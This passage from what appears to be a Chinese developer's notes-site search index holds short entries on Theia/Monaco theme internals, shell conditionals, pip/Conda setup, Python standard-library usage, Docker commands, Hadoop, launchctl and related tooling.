那么vscode的主题是怎么实现动态设置的呢? 在 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/editorDom.ts 下的 RefCountedCssRule class RefCountedCssRule {\n    private _referenceCount: number = 0;\n    private _styleElement: HTMLStyleElement;\n\n    constructor(\n        public readonly key: string,\n        public readonly className: string,\n        _containerElement: HTMLElement | undefined,\n        public readonly properties: CssProperties,\n    ) {\n        this._styleElement = dom.createStyleSheet(\n            _containerElement\n        );\n\n        this._styleElement.textContent = this.getCssText(this.className, this.properties);\n    }\n\n    private getCssText(className: string, properties: CssProperties): string {\n        let str = `.${className} {`;\n        for (const prop in properties) {\n            const value = (properties as any)[prop] as string | ThemeColor;\n            let cssValue;\n            if (typeof value === 'object') {\n                cssValue = `var(${asCssVariableName(value.id)})`;\n            } else {\n                cssValue = value;\n            }\n\n            const cssPropName = camelToDashes(prop);\n            str += `\\n\\t${cssPropName}: ${cssValue};`;\n        }\n        str += `\\n}`;\n        return str;\n    }\n\n    public dispose(): void {\n        this._styleElement.remove();\n    }\n    ...\n\n} 其中 getCssText 就是拿到上面所说的所有转换vs的样式字符串, 主要看\n位于 node_modules/@theia/monaco-editor-core/src/vs/base/browser/dom.ts 的 _styleElement 的创建: export function createStyleSheet(container: HTMLElement = document.getElementsByTagName('head')[0]): HTMLStyleElement {\n    const style = document.createElement('style');\n    style.type = 'text/css';\n    style.media = 'screen';\n    container.appendChild(style);\n    return style;\n} 与theia不同, 它是直接生成一个style然后写进去. 颜色与主题区别 主题注册与切换基本是通过 node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneEditor.ts 下的这两: /**\n* Define a new theme or update an existing theme.\n*/\nexport function defineTheme(themeName: string, themeData: IStandaloneThemeData): void {\n    const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService);\n    standaloneThemeService.defineTheme(themeName, themeData);\n}\n\n/**\n* Switches to a theme.\n*/\nexport function setTheme(themeName: string): void {\n    const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService);\n    standaloneThemeService.setTheme(themeName);\n} 理一下 主题 与 颜色 的区别 主题包含颜色, 与颜色定义,\n但是使用的时候, 是根据注册了哪些颜色, 使用主题里的颜色. 即 只有通过 node_modules/@theia/core/src/browser/color-application-contribution.ts 的 ColorContribution 贡献点的 registerColors 注册的颜色. 下面的 colors 才能生效: {\n    \"$schema\": \"vscode://schemas/color-theme\",\n    \"name\": \"Dark (Custom)\",\n    \"colors\": {\n        \"ideC.editor.background\": \"#1E1E1E\",\n        \"ideC.editor.foreground\": \"#D4D4D4\",\n\n... 除非是内部已经注册的. vscode主题与theia主题的区别 默认情况下, vscode只会处理vscode相关的样式. StandaloneThemeService 上就是这样实例: function getBuiltinRules(builtinTheme: BuiltinTheme): IStandaloneThemeData {\n    switch (builtinTheme) {\n        case VS_LIGHT_THEME_NAME:\n            return vs;\n        case VS_DARK_THEME_NAME:\n            return vs_dark;\n        case HC_BLACK_THEME_NAME:\n            return hc_black;\n        case HC_LIGHT_THEME_NAME:\n            return hc_light;\n    }\n}\n\nfunction newBuiltInTheme(builtinTheme: BuiltinTheme): StandaloneTheme {\n    const themeData = getBuiltinRules(builtinTheme);\n    return new StandaloneTheme(builtinTheme, themeData);\n} 即只处理这四个主题. 另外还有一个 StandaloneThemeService 内的 defineTheme : public defineTheme(themeName: string, themeData: IStandaloneThemeData): void {\n    if (!/&#94;[a-z0-9\\-]+$/i.test(themeName)) {\n        throw new Error('Illegal theme name!');\n    }\n    if (!isBuiltinTheme(themeData.base) && !isBuiltinTheme(themeName)) {\n        throw new Error('Illegal theme base!');\n    }\n    // set or replace theme\n    this._knownThemes.set(themeName, new StandaloneTheme(themeName, themeData));\n\n    ...\n} 这里 this._knownThemes 也会实例一个新的.\n而调用到这的条件还是 node_modules/@theia/monaco/src/browser/textmate/monaco-theme-registry.ts 下 register 的: register(json: any, includes?: { [includePath: string]: any }, givenName?: string, monacoBase?: monaco.editor.BuiltinTheme): ThemeMix {\n    const name = givenName || json.name!;\n    ...\n\n    if (monacoBase && givenName) { ... }\n\n    ...\n\n} 从这一点看, 很多样式在注册主题的时候,\n只要定义了 monacoBase 是基于vs的, 就会同时包含 --theia-xxx 与 --vscode-xxx .\n不过只有setTheme才会触发 --vscode-xxx 的生成, 算是一种懒加载.\n同时, 由于加载顺序的原因, 往往首次加载只会生成vs主题的 --vscode-xxx 样式, 因为这个时候 colors 还没有注册上去,\n而注册 colors 时, 因为主题已经设置好了, 就不会再 settheme 生成 --vscode-xxx 样式了, 除非手动切换一下主题. 故, 自定义的颜色, 还是使用 --theia-xxx 来使用 注意, 注册主题与注册颜色是两个调用","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-Multi--themed.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-Multi--themed.html"},{"title":"node三方库","text":"lodash AnchorJS ajv html-react-parser inversify js-yaml marked nteract pm2 rc-table rst2html semver uglifyjs yargs","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-index.html","loc":"/yq-docs-front-end-node-Three--party-library-index.html"},{"title":"nteract","text":"安装: npm install -g nteract\n# yarn global add nteract 注解 若想直接从源码启动: git clone https://github.com/nteract/nteract.git\ncd nteract\nyarn install\nyarn start 功能: 一个比较高级点的node交互环境.\n与原生node的区别, 类似于 ipython 与 python 启动: nteract 也支持其他语言 可选安装Python kernel Nteract原生支持JavaScript/Node.js,但可以通过额外的kernel packages添加Python等其他语言支持: pip install ipython\npip install nteract-kernel","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-nteracat.html","loc":"/yq-docs-front-end-node-Three--party-library-nteracat.html"},{"title":"shell条件判断if","text":"在条件表达式中进行字符串/数值比较 字符串/数值判断(字符串判断时, shell一个等号与两个等号的效果是一致的): str1 < str2         str1 排列在 str2 之前（取决于语言环境）\nstr1 > str2         str1 排列在 str2 之后（取决于语言环境）\nstr1 = str2         当两个串有相同内容、长度时为真\nstr1 != str2            当串str1和str2不等时为真\n-n str1             当串的长度大于0时为真(串非空)\n-z str1             当串的长度为0时为真(空串)\nstr1                当串str1为非空时为真\nint1 -eq int2       两数相等为真\nint1 -ne int2       两数不等为真\nint1 -gt int2       int1大于int2为真\nint1 -ge int2       int1大于等于int2为真\nint1 -lt int2       int1小于int2为真\nint1 -le int2       int1小于等于int2为真 在条件表达式中进行文件比较 文件判断: -r file     用户可读为真\n-w file     用户可写为真\n-x file     用户可执行为真\n-f file     文件为普通文件为真\n-d file     文件为目录为真\n-c file     文件为字符特殊文件为真\n-b file     文件为块特殊文件为真\n-s file     文件大小非0时为真\n-t file     当文件描述符(默认为1)指定的设备为终端时为真\n-L file     文件存在符号链接为真\n-e file     文件是否存在\n-S file     存在 Socket 文件\n-p file     存在且为 FIFO（pipe）文件\n\nfile1 -nt file2     file1 是否比 file2 新\nfile1 -ot file2     file1 是否比 file2 旧\nfile1 -ef file2     file1 和 file2 位于相同的设备上并且有相同的 inode 编号 判断符号: -a  与\n-o  或\n!   非 例, 比较两个字符串是否相等的办法: if [ \"$test\"x = \"test\"x ]; then 这里的关键有几点： 使用单个等号 注意到等号两边各有一个空格：这是unix shell的要求 注意到\"$test\"x最后的x，这是特意安排的，因为当$test为空的时候，上面的表达式就变成了x = testx，显然是不相等的。而如果没有这个x，表达式就会报错： [: =: unary operator expected 不带if的写法 条件语法: command && if_success_run_this_command_too || true\ncommand || if_not_success_run_this_command_too || true 如下所示是多行脚本片段: if [ conditional_expression ]; then\n    if_success_run_this_command\nelse\n    if_not_success_run_this_command\nfi 这里末尾的 || true 是需要的，\n它可以保证这个 shell 脚本在不小心使用了 -e 选项而被调用时不会在该行意外地退出","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html"},{"title":"包管理器pip/Conda","text":"pip 常用安装选项 install <package> uninstall <package> show <package> list <package> 常用参数 -t 安装时, 指定安装目录 -U , --upgrade 升级安装, 使用与正常的包升级与同版本覆盖安装 查看配置项所在配置文件路径: pip -v config list Debian下配置安装 Linux由于系统内置Python的缘故, 多少有点不同. Debian下如果没有pip, 可以使用apt安装: apt install python-pip                                # py2使用\napt install python3-pip                               # py3使用 注意这安装的是于系统默认Python匹配的版本 配置pip源基本一致（需要自定义才配置，默认国外的太慢）,\n在用户目录下创建 ~/.pip/pip.conf 配置文件，内容: [global]\nindex-url = https://pypi.tuna.tsinghua.edu.cn/simple\n# index-url = http://pypi.douban.com/simple         # 豆瓣源;可以换成其他的源\ndisable-pip-version-check = true                        # 取消pip版本检查&#xff0c;排除每次都报最新的pip\ntimeout = 120\n[install]\ntrusted-host = pypi.tuna.tsinghua.edu.cn\n# trusted-host = pypi.douban.com                        # 添加豆瓣源为可信主机&#xff0c;要不然可能报错 或者执行的时候直接指定: pip instal soft -i \"https://pypi.tuna.tsinghua.edu.cn/simple\" --trusted-host pypi.douban.com Mac配置pip源 cd ~\nmkdir .pip && cd .pip echo \"[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=pypi.douban.com \" >pip.conf 注解 其他源 # 清华大学：\nhttps://pypi.tuna.tsinghua.edu.cn/simple/\n# 阿里云：\nhttp://mirrors.aliyun.com/pypi/simple/\nhttps://mirrors.aliyun.com/pypi/simple/\n# 中国科技大学：\nhttps://pypi.mirrors.ustc.edu.cn/simple/\n# 华中理工大学：\nhttp://pypi.hustunique.com/\n# 山东理工大学：\nhttp://pypi.sdutlinux.org/\n# 豆瓣： # (已失效)\nhttp://pypi.douban.com/simple/\nhttps://pypi.douban.com/simple/ Conda 可以通过以下地址下载对应系统的资源安装: https://repo.anaconda.com/archive/ 项目github地址: https://github.com/conda 查看有哪些环境: conda env list 创建指定Python版本的环境: conda create --name py37 python=3.7 复制环境py37为一个新的py379: conda create -n py379 --clone py37 删除环境 py379: conda remove -n py379 --all 打包为离线环境 先安装pack: conda install conda-pack\n# conda install -c conda-forge conda-pack 也可以pip安装: pip install conda-pack 下面以导出 venv-py379 为例 新建此环境: conda create --name venv-py379 python=3.7.9 激活环境: conda activate venv-py379 安装pack: conda install conda-pack 打包为 py379.tar.gz : conda pack -n venv-py379 -o py379.tar.gz 目标机器上使用 py379.tar.gz 创建虚拟环境所在目录并解压: mkdir venv-py379\ntar -xzf py379.tar.gz -C venv-py379 激活环境: . ./venv-py379/bin/activate 清除前缀: conda-unpack 清除前缀是因为可能有些库啊什么的允许会依赖有其他路径的东西,\n不清除后配置为自己conda的用不了 注解 也支持API使用: import conda_pack\n\n# 把虚拟环境 my_env 打包为 my_env.tar.gz\nconda_pack.pack(name=\"my_env\")\n\n# -o 参数指定打包路径和名称，把虚拟环境 my_env 打包为 out_name.tar.gz\nconda_pack.pack(name=\"my_env\", output=\"out_name.tar.gz\")\n\n# 把某个特定路径的虚拟环境打包为 my_env.tar.gz\nconda_pack.pack(prefix=\"/explicit/path/to/my_env\") conda_pack文档: https://conda.github.io/conda-pack/cli.html 打包为配置 激活环境后: conda env export > py379.yaml 然后将这个yaml复制到目标机器: conda env create -f py379.yaml","tags":"后端; python","url":"/yq-docs-rear-end-python-Bag-manager.html","loc":"/yq-docs-rear-end-python-Bag-manager.html"},{"title":"str","text":"python3一个新特性就是对文本和二进制做了更清晰的划分，\n文本是str，二进制是byte(x01x06...) 编码: encode：str --> byte 解码: decode：byte --> str join: ''.join(list)                 #将list转换为字符串，以''中定义的字符串分隔 str.split: str.split('')                 #将str以''中定义的分隔为数组 rpartition, 从右边第一个指定的字符开始分隔: #!/usr/bin/python\n\nstr = \"www.runoob.com\"\n\nprint str.rpartition(\".\")\n\n# ('www.runoob', '.', 'com') 数字操作 hex(), 10进制整数转换成16进制 字符串的拼接使用join 字符串的拼接有两种方式\n- +     如果有n个字符串需要拼接，就会进行n-1次内存空间申请\n- join  只会进行一次空间申请，申请时会统计所有字符串的个数，以及总的长度。再逐一进行字符串的拷贝 求其中某值的个数 使用 count, 如: In [22]: \"1110\".count(\"1\")\nOut[22]: 3 zfill 字符串指定长度, 左侧补0: In [4]: \"123\".zfill(5)\nOut[4]: '00123' ljust 字符串指定长度, 左侧对齐, 右侧补充指定字符 如左对齐, 右侧补0: In [2]: \"123\".ljust(5, \"0\")\nOut[2]: '12300' rjust 字符串指定长度, 右侧对齐, 左侧补充指定字符 如右对齐, 左侧补0: In [3]: \"123\".rjust(5, \"0\")\nOut[3]: '00123' lower 将字符串全部转换为小写 upper 将字符串全转换为大写 title 将字符串首字母大写","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-STR.html","loc":"/yq-docs-rear-end-python-Built--in-function-STR.html"},{"title":"debian下的安装","text":"使用docker配置, 见: 配置debian容器 安装 Python3 必要的包: apt install python3 python3-pip python3-venv vim 配置 pip 豆瓣源: cd ~\nmkdir .pip && cd .pip\necho \"[global]\nindex-url = https://pypi.tuna.tsinghua.edu.cn/simple\n# index-url = https://pypi.douban.com/simple/\n[install]\ntrusted-host=pypi.tuna.tsinghua.edu.cn\n# trusted-host=pypi.douban.com\n\" >pip.conf 官网要求安装的依赖包: apt install libgl-dev python3-dev python3-distutils python3-setuptools 配置虚拟环境: python3 -m venv dev_venv\n\n. dev_venv/bin/activate 拉去源码并构建: apt install git cmake\n\nmkdir project && cd project\n\ngit clone https://code.qt.io/pyside/pyside-setup\n\ncd pyside-setup && git checkout 6.4 && pip install -r requirements.txt\n\npython setup.py build --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8\n\npython setup.py install --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8 整体源码:","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html"},{"title":"collections","text":"deque 队列 deque(maxlen) maxlen: int 设置队列的长度 在队列两端插入或删除元素时间复杂度都是 O(1) 在列表的开头插入或删除元 素的时间复杂度为 O(N) defaultdict 具有默认值的字典 OrderedDict 自排序的字典(保持插入时顺序) OrderedDict 内部维护着一个根据键插入顺序排序的双向链表。\n每次当一个新的 元素插入进来的时候，它会被放到链表的尾部。\n对于一个已经存在的键的重复赋值不会改变键的顺序。 需要注意的是，一个 OrderedDict 的大小是一个普通字典的两倍，\n因为它内部维 护着另外一个链表。\n所以如果你要构建一个需要大量 OrderedDict 实例的数据结构的 时候\n(比如读取 100,000 行 CSV 数据到一个 OrderedDict 列表中去)，\n那么你就得仔 细权衡一下是否使用 OrderedDict 带来的好处要大过额外内存消耗的影响。 Counter 计算出现次数 下面有一个 most_common() 返回出现次数最多的: words = [\n    'look', 'into', 'my', 'eyes', 'look', 'into', 'my', 'eyes',\n    'the', 'eyes', 'the', 'eyes', 'the', 'eyes', 'not', 'around', 'the',\n    'eyes', \"don't\", 'look', 'around', 'the', 'eyes', 'look', 'into',\n    'my', 'eyes', \"you're\", 'under'\n]\nfrom collections import Counter\nword_counts = Counter(words)\n# 出现频率最高的 3 个单词\ntop_three = word_counts.most_common(3)\nprint(top_three)\n# Outputs [('eyes', 8), ('the', 5), ('look', 4)] 作为输入，Counter 对象可以接受任意的由可哈希(hashable)元素构成的序列 对象。\n在底层实现上，一个 Counter 对象就是一个字典，将元素映射到它出现的次数 上。比如: >>> word_counts['not'] 1\n>>> word_counts['eyes'] 8\n>>> 同时也支持数学运算操作 Counter 对象在几乎所有需要制表或者计数数据的场合是非常有用的 工具。\n在解决这类问题的时候你应该优先选择它，而不是手动的利用字典去实现。 Counter求交集 求交集(且保留最小值) 假设 secret = \"1123\" 且 guess = \"0111\" ，\n那么 Counter(secret) 会得到: Counter({'1': 2, '2': 1, '3': 1}) 而 Counter(guess) 会得到: Counter({'0': 1, '1': 3}) 取它们的交集后得到: # 交集只有 1, 取其中小的个数 2\nCounter({'1': 2}) 表示在 secret 和 guess 中都有的数字 1 的数量为 2。 total Counter().total()表示当前总的个数, 比如: Counter({'1': 2, '2': 3}).total() == 5 namedtuple 映射元组到对象: >>> from collections import namedtuple\n>>> Subscriber = namedtuple('Subscriber', ['addr', 'joined'])\n>>> sub = Subscriber('jonesy@example.com', '2012-10-19')\n>>> sub\nSubscriber(addr='jonesy@example.com', joined='2012-10-19')\n>>> sub.addr\n'jonesy@example.com'\n>>> sub.joined\n'2012-10-19'\n>>> 跟元组类型是可交换 的，支持所有的普通元组操作，比如索引和解压。比如: >>> len(sub)\n2\n>>> addr, joined = sub >>> addr 'jonesy@example.com' >>> joined '2012-10-19' 命名元组的一个主要用途是将你的代码从下标操作中解脱出来。 命名元组另一个用途就是作为字典的替代，因为字典存储需要更多的内存空间。 注意一个命名元组是不可更改的, 如有特殊需要, 使用 _replace >>> s = Stock('ACME', 100, 123.45)\n>>> s\nStock(name='ACME', shares=100, price=123.45)\n>>> s.shares = 75\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nAttributeError: can't set attribute\n>>>\n>>> s = s._replace(shares=75)\n>>> s\nStock(name='ACME', shares=75, price=123.45)\n>>> ChainMap 链式合并字典. 假如你有如下两个字典: a = {'x': 1, 'z': 3 }\nb = {'y': 2, 'z': 4 } 现在假设你必须在两个字典中执行查找操作(比如先从 a 中找，如果找不到再在 b 中找)。\n一个非常简单的解决方案就是使用 collections 模块中的 ChainMap 类。比如: from collections import ChainMap c = ChainMap(a,b)\nprint(c['x']) # Outputs 1 (from a) print(c['y']) # Outputs 2 (from b) print(c['z']) # Outputs 3 (from a)\n>>> len(c)\n3\n>>> list(c.keys()) ['x', 'y', 'z']\n>>> list(c.values()) [1, 2, 3]\n>>> 一个 ChainMap 接受多个字典并将它们在逻辑上变为一个字典。\n然后，这些字典并 不是真的合并在一起了，ChainMap 类只是在内部创建了一个容纳这些字典的列表并重 新定义了一些常见的字典操作来遍历这个列表。\n大部分字典操作都是可以正常使用的， 比如:\n如果出现重复键，那么第一次出现的映射值会被返回。 因此，例子程序中的 c['z'] 总是会返回字典 a 中对应的值，而不是 b 中对应的值。\n对于字典的更新或删除操作总是影响的是列表中第一个字典。比如: >>> c['z'] = 10\n>>> c['w'] = 40\n>>> del c['x']\n>>> a\n{'w': 40, 'z': 10}\n>>> del c['y']\nTraceback (most recent call last): ...\n    KeyError: \"Key not found in the first mapping: 'y'\"\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Collections.html","loc":"/yq-docs-rear-end-python-python-standard-library-Collections.html"},{"title":"itertools","text":"官网: https://docs.python.org/zh-cn/3/library/itertools.html groupby 根据某个记录分组: rows = [\n    {'address': '5412 N CLARK', 'date': '07/01/2012'},\n    {'address': '5148 N CLARK', 'date': '07/04/2012'},\n    {'address': '5800 E 58TH', 'date': '07/02/2012'},\n    {'address': '2122 N CLARK', 'date': '07/03/2012'},\n    {'address': '5645 N RAVENSWOOD', 'date': '07/02/2012'},\n    {'address': '1060 W ADDISON', 'date': '07/02/2012'},\n    {'address': '4801 N BROADWAY', 'date': '07/01/2012'},\n    {'address': '1039 W GRANVILLE', 'date': '07/04/2012'},\n] 根据日期分组: from operator import itemgetter\nfrom itertools import groupby\n\n# Sort by the desired field first\nrows.sort(key=itemgetter('date'))\n# Iterate in groups\nfor date, items in groupby(rows, key=itemgetter('date')):\n  print(date)\n  for i in items:\n    print(' ', i) 一个非常重要的准备步骤是要根据指定的字段将数据排序。\n因为 groupby() 仅仅 检查连续的元素，如果事先并没有排序完成的话，分组函数将得不到想要的结果。 compress itertools.compress 以一个 iterable 对象和一个相对应的Boolean选择器序列作为输入参数。\n然后输出iterable对象中对 应选择器为 True 的元素: addresses = [\n    '5412 N CLARK',\n    '5148 N CLARK',\n    '5800 E 58TH',\n    '2122 N CLARK',\n    '5645 N RAVENSWOOD',\n    '1060 W ADDISON',\n    '4801 N BROADWAY',\n    '1039 W GRANVILLE',\n]\ncounts = [ 0, 3, 10, 4, 1, 7, 6, 1] 操作: >>> from itertools import compress\n>>> more5 = [n > 5 for n in counts]\n>>> more5\n[False, False, True, False, False, True, True, False]\n>>> list(compress(addresses, more5))\n['5800 E 58TH', '1060 W ADDISON', '4801 N BROADWAY']\n>>> 关键点在于先创建一个 Boolean 序列，指示哪些元素符合条件。\n然后 compress() 函数根据这个序列去选择输出对应位置为 True 的元素。 和 filter() 函数类似，compress() 也是返回的一个迭代器。 permutations 排列函数, 比如获取某个迭代的全排列 如, 从num中抽2个获取全排列: permutations('ABCD', 2) 结果: AB AC AD BA BC BD CA CB CD DA DB DC combinations 组合函数, 从某个迭代中抽取指定的不重复元素个数组合 如, 从num中抽2个组合(不重复): combinations('ABCD', 2)\n\nAB AC AD BC BD CD combinations_with_replacement 组合函数, 从某个迭代中抽取指定的重复元素个数组合 如, 从num中抽2个组合(可重复): combinations_with_replacement('ABCD', 2)\n\nAA AB AC AD BB BC BD CC CD DD zip_longest 与 zip 类似, 不过 zip 返回的结果以最短的序列为准, zip_longest以最长的序列为准: In [18]: from itertools import zip_longest\n\nIn [19]: list(zip('ABC', range(5), [10, 20, 30, 40]))\nOut[19]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30)]\n\nIn [20]: list(zip_longest('ABC', range(5), [10, 20, 30, 40]))\nOut[20]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30), (None, 3, 40), (None, 4, None)]\n\nIn [21]: starmap 乘法运算符可以被映射到两个向量之间执行高效的点积: sum(starmap(operator.mul, zip(vec1, vec2, strict=True)))。 注解 operator 见 operator 再如统计两个数组a, b中索引与元素都相等的个数: starmap(operator.eq, zip(a, b))","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Itertools.html","loc":"/yq-docs-rear-end-python-python-standard-library-Itertools.html"},{"title":"docker常用指令","text":"docker_command 其它 # 登录私有地址, 可加 --username= 指定用户名, 然后手动输入密码 docker login $address # cat ~/.docker/config.json 验证是否成功, 成功登录有 auths 配置 # 拉取镜像, 公共仓库用镜像名字, 私有仓库用地址名加镜像名字 docker pull $image_name # 上传镜像, 公共仓库不用地址直接镜像名即可 docker push $address $image_name # 查看已下载镜像 docker images # 运行一个容器, 若不存在自动从官网拉取 # -d 后台运行 # -p 后跟端口 port1:port2 将容器内部服务器端口port2映射到本地端口port1(如果-p后什么也不写，随机分配端口) # --rm 容器停止之后会自动删除 docker run $image_name # 搜索镜像 docker search $image_name # 查看所有容器 # ps 查看运行中的docker docker ps -a # 删除容器 docker rm 容器id # 启动容器 docker start 容器id # 停止所有容器 docker stop $( docker ps -a -q ) # remove删除所有容器 docker rm $( docker ps -a -q ) # 重启容器 docker restart $image_name # 查看日志, 如查看mysql日志 docker logs -f mysql57 # 进入容器, 如进入mysql容器 # -t 在容器里生产一个伪终端 # -i 对容器内的标准输入 (STDIN) 进行交互 docker exec -ti mysql57 /bin/bash # 查看容器信息 docker inspect $image_name # 例子 docker run -p 3306 :3306 --name mysql57 \\ -v $PWD /conf:/etc/mysql \\ -v $PWD /logs:/var/log/mysql \\ -v $PWD /data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD = 123456 \\ -d mysql:5.7 \\ --character-set-server = utf8mb4 \\ --collation-server = utf8mb4_unicode_ci # 参数选项 –name：容器名, 比如mysql57\n-v：挂载目录\n-e：配置信息, 比如配置mysql的root用户的登陆密码\n-p：端口映射, 比如映射 主机3306端口 到 容器的3306端口\n-d：源镜像名, 比如为 mysql:5.7并后台运行 后面为设置mysql的默认编码","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html","loc":"/yq-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html"},{"title":"Docker命令大全","text":"容器生命周期管理 容器操作 本地镜像管理 镜像仓库 容器rootfs命令 info_version","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-index.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-index.html"},{"title":"关于广告","text":"只谈近来, 去年用的三星手机, 虽然系统内广告较少, 但是这两年的三星, 没有12G的小体量运存,\n然后导致我的这S22就发烫, 卡, 杀后台... 一年多后, 终于无法忍受, 千挑万选选了个RedMi K60, 16 + 256, 而且不超过2500就能拿到, 比跳水王三星好多了,\n就是没三星好看. 如果三星今年的23有12G运存版本倒是可能会考虑降价后买... 可惜已经连续几年的没有了... 然后就理所当然的遭受了国产广告的侵扰, 最初本来打算从网络代理和安卓跳转监听API的两个方向来自己写程序处理,\n还研究了一下, 最终决定使用Java开发, 再之后繁忙, 比如塞尔达, 比如工作啥的, 就搁置.\n再之后想着, 这玩意儿不应该只有我想过, 有没有可以直接用的现成软件? 然后找到了AdGuard. AdGuard提供了两种: AdGuard 个人版使用, 收费, 个人版终身许可证189 AdGuard Home 这个稍微专业一点, 开源免费, 适用于家庭网络, 局域网, 可以理解作为一个网关, 然后局域网设备就\n不用额外安装其他软件. 不过缺点是网关设备需要一直开机, 这个倒是可以考虑使用VPS解决. 地址: https://adguard.com/zh_cn/welcome.html https://adguard.com/zh_cn/adguard-home/overview.html 最初看到讨论是在 https://www.zhihu.com/question/482691819 注解 这是属于那种原理简单但是做起来比较复杂的那种, 比如如何判断哪些请求是属于广告访问,\n所以有现成轮子可用何必自己再去搞.","tags":"杂乱无章","url":"/yq-docs-Chaotic-About-advertising.html","loc":"/yq-docs-Chaotic-About-advertising.html"},{"title":"Hadoop","text":"一个分布式框架，\n该框架允许使用简单的编程模型跨计算机集群对大型数据集进行分布式处理。\n它旨在从单个服务器扩展到数千台机器，每台机器都提供本地计算和存储。 库本身不用于依靠硬件来提供高可用性，而是被设计用来检测和处理应用程序层的故障，\n因此可以在计算机集群的顶部提供高可用性服务，每台计算机都容易出现故障。 核心 HDFS 分布式文件系统, 对应Google的 GFS MapReduce 分布式计算框架, 对应Google的 MapReduce HBASE 实时分布式数据库, 对应Google的 BigTable HDFS结构 NameNode（名称节点） DataNode（数据节点） Client（客户机） NameNode 是Master节点（主节点），可以看作是分布式文件系统中的管理者，\n主要负责管理文件系统的命名空间、集群配置信息和存储块的复制等。\nNameNode会将文件系统的Meta-data存储在内存中，\n这些信息主要包括了文件信息、每一个文件对应的文件块的信息和每一个文件块在DataNode的信息等。 DataNode 是Slave节点（从节点），是文件存储的基本单元，\n它将Block存储在本地文件系统中，保存了Block的Meta-data，同时周期性地将所有存在的Block信息发送给NameNode。 Client 切分文件；访问HDFS；与NameNode交互，获得文件位置信息；与DataNode交互，读取和写入数据。 还有一个Block（块）的概念：Block是HDFS中的基本读写单元；\nHDFS中的文件都是被切割为block（块）进行存储的；\n这些块被复制到多个DataNode中；块的大小（通常为64MB）和复制的块数量在创建文件时由Client决定。 MapReduce 注解 MapReduce 是面向磁盘的 MapReduce其实是一种编程模型。这个模型的核心步骤主要分两部分：Map（映射）和Reduce（归约）。 当你向MapReduce框架提交一个计算作业时，它会首先把计算作业拆分成若干个Map任务，\n然后分配到不同的节点上去执行，每一个Map任务处理输入数据中的一部分，\n当Map任务完成后，它会生成一些中间文件，这些中间文件将会作为Reduce任务的输入数据。 Reduce任务的主要目标就是把前面若干个Map的输出汇总到一起并输出。 在MapReduce里，为了完成上面这些过程，需要两个角色：JobTracker和TaskTracker。 JobTracker用于调度和管理其它的TaskTracker。JobTracker可以运行于集群中任一台计算机上。TaskTracker 负责执行任务，必须运行于 DataNode 上。 版本历史 2011年11月，Hadoop 1.0.0版本正式发布，意味着可以用于商业化。 但是，1.0版本中，存在一些问题： 扩展性差，JobTracker负载较重，成为性能瓶颈。 可靠性差，NameNode只有一个，万一挂掉，整个系统就会崩溃。 仅适用MapReduce一种计算方式。 资源管理的效率比较低。 所以，2012年5月，Hadoop推出了 2.0版本 。 2.0版本中，在HDFS之上，增加了YARN（资源管理框架）层。它是一个资源管理模块，为各类应用程序提供资源管理和调度。 参考: 深入浅出大数据：到底什么是Hadoop？","tags":"大数据","url":"/yq-docs-Chaotic-Big-Data-Hadoop.html","loc":"/yq-docs-Chaotic-Big-Data-Hadoop.html"},{"title":"大数据","text":"Hadoop","tags":"大数据","url":"/yq-docs-Chaotic-Big-Data-index.html","loc":"/yq-docs-Chaotic-Big-Data-index.html"},{"title":"Android Studio","text":"将本地已有的Gradle配置到项目. Studio中的位置图示 安装Gradle可参考 gradle 注解 若build发现位置与配置的不一致, 关闭重新打开即可. 另Linux/Mac需要主要安装位置的权限问题","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Android_studio.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Android_studio.html"},{"title":"mac下应用运行管理","text":"前言 相关的指令 launchctl # 显示当前的启动脚本 launchctl list # 开机时自动启动Apache服务器 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist # 设置开机启动并立即启动改服务 launchctl load -w **.pist # 设置开机启动但不立即启动服务 launchctl load **.pist # 停止正在运行的启动脚本 sudo launchctl unload [ path/to/script ] # 再加上-w选项即可去除开机启动 sudo launchctl unload -w [ path/to/script ] 注解 launchctl 管理 MacOS 的启动脚本, 控制启动计算机时需要开启的服务。也可以设置定时执行特定任务的脚本, 就像Linux cron一样。 launchctl需要 root 权限。 参考: MacOS launchctl 启动进程控制 使用 直接举例, 例如要停止Docker yanque@yanquedembp ~ % launchctl list | grep docker\n- 0 com.docker.helper 1333 0 application.com.docker.docker.25263488.25263866\nyanque@yanquedembp ~ % launchctl stop application.com.docker.docker.25263488.25263866","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html"},{"title":"Chrome开发者工具","text":"一般默认 F12 即可打开 标签 Elements 此界面显示 HTML 的渲染内容, 可 